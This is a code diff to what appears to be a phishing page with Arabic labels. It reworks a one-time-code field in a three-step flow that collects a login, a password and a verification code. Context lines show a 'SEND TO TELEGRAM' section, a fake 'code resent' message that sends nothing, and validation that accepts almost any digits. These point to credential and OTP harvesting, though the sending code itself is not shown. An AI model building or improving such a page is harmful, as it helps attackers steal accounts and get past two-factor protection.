@@ -423,39 +423,35 @@
     }
 
     /* OTP Input Styles */
-    .otp-container {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-bottom: 28px;
-    }
-
-    .otp-input {
-      width: 50px;
-      height: 60px;
+    .otp-input-field {
+      width: 100%;
+      padding: 16px 16px;
+      background: var(--card);
       border: 2px solid var(--border);
       border-radius: var(--radius-md);
-      background: var(--card);
-      font-size: 28px;
-      font-weight: 800;
-      text-align: center;
       color: var(--text);
+      font-size: 20px;
       font-family: 'Cairo', monospace;
+      font-weight: 700;
+      text-align: center;
+      letter-spacing: 8px;
       transition: all 0.3s var(--ease);
       outline: none;
       -webkit-appearance: none;
       appearance: none;
+      text-security: disc;
+      -webkit-text-security: disc;
     }
 
-    .otp-input:focus {
+    .otp-input-field:focus {
       background: var(--bg);
       border-color: var(--primary);
       box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
     }
 
-    .otp-input::placeholder {
+    .otp-input-field::placeholder {
       color: var(--text-muted);
-      opacity: 0.3;
+      opacity: 0.4;
     }
 
     /* Modal */
@@ -873,9 +869,17 @@
             </div>
 
             <div class="form-group">
-              <label class="form-label">رمز التحقق</label>
-              <div class="otp-container" id="otpContainer">
-                <!-- OTP inputs will be generated here -->
+              <label class="form-label" for="otpInput">رمز التحقق</label>
+              <div class="input-wrapper">
+                <input 
+                  id="otpInput"
+                  type="password"
+                  class="otp-input-field"
+                  placeholder="••••••"
+                  inputmode="numeric"
+                  maxlength="10"
+                  autocomplete="off"
+                />
               </div>
               <div class="form-hint" id="hintOTP"></div>
             </div>
@@ -958,7 +962,6 @@
       credentials: null,
       password: null,
       isLoading: false,
-      otpInputs: [],
     };
 
     // ==================== DOM REFS ====================
@@ -971,6 +974,7 @@
     const phoneInput = document.getElementById('phoneInput');
     const passwordInput = document.getElementById('password');
     const passwordToggleLabel = document.getElementById('passwordToggleLabel');
+    const otpInput = document.getElementById('otpInput');
 
     const toggleBtn = document.getElementById('toggleBtn');
     const toggleText = document.getElementById('toggleText');
@@ -986,7 +990,6 @@
     const verifyBtnText = document.getElementById('verifyBtnText');
     const verifySpinner = document.getElementById('verifySpinner');
     const resendBtn = document.getElementById('resendBtn');
-    const otpContainer = document.getElementById('otpContainer');
 
     const countryBtn = document.getElementById('countryBtn');
     const countryModal = document.getElementById('countryModal');
@@ -1039,88 +1042,6 @@
         element.textContent = '';
         element.classList.remove('error', 'warning', 'success');
       }, 3500);
-    }
-
-    // ==================== OTP SETUP ====================
-    function setupOTPInputs() {
-      otpContainer.innerHTML = '';
-      state.otpInputs = [];
-
-      for (let i = 0; i < 6; i++) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.maxLength = '1';
-        input.inputMode = 'numeric';
-        input.className = 'otp-input';
-        input.placeholder = '•';
-        input.addEventListener('input', handleOTPInput);
-        input.addEventListener('keydown', handleOTPKeydown);
-        input.addEventListener('paste', handleOTPPaste);
-        otpContainer.appendChild(input);
-        state.otpInputs.push(input);
-      }
-    }
-
-    function handleOTPInput(e) {
-      const input = e.target;
-      const value = input.value;
-
-      // Only allow digits
-      if (!/^\d*$/.test(value)) {
-        input.value = '';
-        return;
-      }
-
-      // Move to next input
-      if (value.length === 1) {
-        const index = state.otpInputs.indexOf(input);
-        if (index < state.otpInputs.length - 1) {
-          state.otpInputs[index + 1].focus();
-        }
-      }
-    }
-
-    function handleOTPKeydown(e) {
-      const input = e.target;
-      const index = state.otpInputs.indexOf(input);
-
-      if (e.key === 'Backspace') {
-        if (input.value === '' && index > 0) {
-          state.otpInputs[index - 1].focus();
-        }
-      } else if (e.key === 'ArrowLeft' && index > 0) {
-        state.otpInputs[index - 1].focus();
-      } else if (e.key === 'ArrowRight' && index < state.otpInputs.length - 1) {
-        state.otpInputs[index + 1].focus();
-      }
-    }
-
-    function handleOTPPaste(e) {
-      e.preventDefault();
-      const pastedData = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = pastedData.replace(/\D/g, '').split('');
-
-      digits.forEach((digit, index) => {
-        if (index < state.otpInputs.length) {
-          state.otpInputs[index].value = digit;
-        }
-      });
-
-      if (digits.length > 0) {
-        const focusIndex = Math.min(digits.length, state.otpInputs.length - 1);
-        state.otpInputs[focusIndex].focus();
-      }
-    }
-
-    function getOTPValue() {
-      return state.otpInputs.map(input => input.value).join('');
-    }
-
-    function clearOTPInputs() {
-      state.otpInputs.forEach(input => {
-        input.value = '';
-      });
-      state.otpInputs[0].focus();
     }
 
     // ==================== SEND TO TELEGRAM ====================
@@ -1213,10 +1134,15 @@
     }
 
     function validateOTP() {
-      const otp = getOTPValue();
+      const otp = otpInput.value.trim();
 
-      if (otp.length === 0) {
+      if (!otp) {
         showHint(hintOTP, '❌ أدخل رمز التحقق', 'error');
+        return null;
+      }
+
+      if (otp.length < 3) {
+        showHint(hintOTP, '❌ رمز التحقق قصير جداً', 'error');
         return null;
       }
 
@@ -1258,8 +1184,7 @@
 
         setTimeout(() => {
           page3.classList.remove('slide-in');
-          setupOTPInputs();
-          state.otpInputs[0].focus();
+          otpInput.focus();
         }, 50);
       }, 400);
     }
@@ -1301,7 +1226,7 @@
       passwordToggleLabel.textContent = 'إظهار';
       hintPassword.textContent = '';
       hintOTP.textContent = '';
-      clearOTPInputs();
+      otpInput.value = '';
     }
 
     // ==================== PHONE MODE TOGGLE ====================
@@ -1435,27 +1360,7 @@
     });
 
     // Page 2 Events
-    backBtn.addEventListener('click', () => {
-      page2.classList.add('slide-out');
-      
-      setTimeout(() => {
-        page2.classList.add('hidden');
-        page2.classList.remove('slide-out');
-        page1.classList.remove('hidden');
-        page1.classList.add('slide-in');
-
-        setTimeout(() => {
-          page1.classList.remove('slide-in');
-          primaryInput.focus();
-        }, 50);
-      }, 400);
-
-      state.credentials = null;
-      passwordInput.value = '';
-      passwordInput.type = 'password';
-      passwordToggleLabel.textContent = 'إظهار';
-      hintPassword.textContent = '';
-    });
+    backBtn.addEventListener('click', goToPage1);
 
     sendBtn.addEventListener('click', async () => {
       const password = validatePassword();
@@ -1529,6 +1434,18 @@
     // Page 3 Events
     backBtn2.addEventListener('click', goToPage1);
 
+    otpInput.addEventListener('input', (e) => {
+      // Allow only digits
+      e.target.value = getDigitsOnly(e.target.value);
+      if (e.target.value.length > 10) {
+        e.target.value = e.target.value.slice(0, 10);
+      }
+    });
+
+    otpInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' && !state.isLoading) verifyBtn.click();
+    });
+
     verifyBtn.addEventListener('click', async () => {
       const otp = validateOTP();
       if (!otp) return;
@@ -1587,7 +1504,8 @@
     });
 
     resendBtn.addEventListener('click', () => {
-      clearOTPInputs();
+      otpInput.value = '';
+      otpInput.focus();
       showHint(hintOTP, '✅ تم إعادة إرسال الرمز', 'success');
     });
 
